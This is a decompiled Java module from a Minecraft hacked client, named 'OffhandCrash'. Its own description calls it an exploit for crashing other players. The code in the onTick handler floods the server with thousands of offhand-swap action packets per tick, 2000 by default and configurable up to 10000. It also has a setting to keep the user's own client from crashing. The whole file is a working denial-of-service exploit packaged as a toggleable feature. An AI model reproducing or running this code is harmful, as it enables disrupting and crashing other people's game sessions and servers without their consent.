/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  io.netty.channel.Channel
 *  net.minecraft.util.math.BlockPos
 *  net.minecraft.util.math.Direction
 *  net.minecraft.network.packet.c2s.play.PlayerActionC2SPacket
 *  net.minecraft.network.packet.c2s.play.PlayerActionC2SPacket.Action
 */
package minegame159.meteorclient.systems.modules.misc;

import io.netty.channel.Channel;
import meteordevelopment.orbit.EventHandler;
import minegame159.meteorclient.events.world.TickEvent;
import minegame159.meteorclient.mixin.ClientConnectionAccessor;
import minegame159.meteorclient.settings.BoolSetting;
import minegame159.meteorclient.settings.IntSetting;
import minegame159.meteorclient.settings.Setting;
import minegame159.meteorclient.settings.SettingGroup;
import minegame159.meteorclient.systems.modules.Categories;
import minegame159.meteorclient.systems.modules.Module;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.math.Direction;
import net.minecraft.network.packet.c2s.play.PlayerActionC2SPacket;

public class OffhandCrash
extends Module {
    private final /* synthetic */ Setting<Boolean> doCrash;
    private final /* synthetic */ Setting<Boolean> antiCrash;
    private final /* synthetic */ SettingGroup sgGeneral;
    private final /* synthetic */ Setting<Integer> speed;
    private static final /* synthetic */ PlayerActionC2SPacket PACKET;

    @EventHandler
    private void onTick(TickEvent.Post llllllllllllllllIlllIlllIIIlIIIl) {
        OffhandCrash llllllllllllllllIlllIlllIIIlIIlI;
        if (llllllllllllllllIlllIlllIIIlIIlI.doCrash.get().booleanValue()) {
            Channel llllllllllllllllIlllIlllIIIlIIll = ((ClientConnectionAccessor)llllllllllllllllIlllIlllIIIlIIlI.mc.player.networkHandler.getConnection()).getChannel();
            for (int llllllllllllllllIlllIlllIIIlIlII = 0; llllllllllllllllIlllIlllIIIlIlII < llllllllllllllllIlllIlllIIIlIIlI.speed.get(); ++llllllllllllllllIlllIlllIIIlIlII) {
                llllllllllllllllIlllIlllIIIlIIll.write((Object)PACKET);
            }
            llllllllllllllllIlllIlllIIIlIIll.flush();
        }
    }

    public boolean isAntiCrash() {
        OffhandCrash llllllllllllllllIlllIlllIIIIlIll;
        return llllllllllllllllIlllIlllIIIIlIll.isActive() && llllllllllllllllIlllIlllIIIIlIll.antiCrash.get() != false;
    }

    static {
        PACKET = new PlayerActionC2SPacket(Action.SWAP_ITEM_WITH_OFFHAND, new BlockPos(0, 0, 0), Direction.UP);
    }

    public OffhandCrash() {
        super(Categories.Misc, "offhand-crash", "An exploit that can crash other players by swapping back and forth between your main hand and offhand.");
        OffhandCrash llllllllllllllllIlllIlllIIIllIIl;
        llllllllllllllllIlllIlllIIIllIIl.sgGeneral = llllllllllllllllIlllIlllIIIllIIl.settings.getDefaultGroup();
        llllllllllllllllIlllIlllIIIllIIl.doCrash = llllllllllllllllIlllIlllIIIllIIl.sgGeneral.add(new BoolSetting.Builder().name("do-crash").description("Sends X number of offhand swap sound packets to the server per tick.").defaultValue(true).build());
        llllllllllllllllIlllIlllIIIllIIl.speed = llllllllllllllllIlllIlllIIIllIIl.sgGeneral.add(new IntSetting.Builder().name("speed").description("The amount of swaps measured in ticks.").defaultValue(2000).min(1).sliderMax(10000).build());
        llllllllllllllllIlllIlllIIIllIIl.antiCrash = llllllllllllllllIlllIlllIIIllIIl.sgGeneral.add(new BoolSetting.Builder().name("anti-crash").description("Attempts to prevent you from crashing yourself.").defaultValue(true).build());
    }
}

